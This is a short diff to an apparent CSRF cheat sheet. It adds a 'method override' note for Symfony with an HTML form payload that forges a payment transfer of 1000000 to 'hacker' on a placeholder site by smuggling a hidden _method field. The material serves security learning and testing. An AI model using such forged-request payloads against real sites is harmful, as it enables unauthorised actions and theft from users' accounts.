@@ -57,5 +57,15 @@ https://security.love/CSRF-PoC-Genorator/
   </body>
 </html>
 
-
 ```
+
+- Method Overwrite Symphony : 
+Even with if `get`is not allowed you can still override with _method
+```sh
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+<input type="hidden" name="_method" value="GET">
+<input type="hidden" name="recipient" value="hacker">
+<input type="hidden" name="amount" value="1000000">
+</form>
+```
+`Other frameworks support a variety of similar parameters.`  
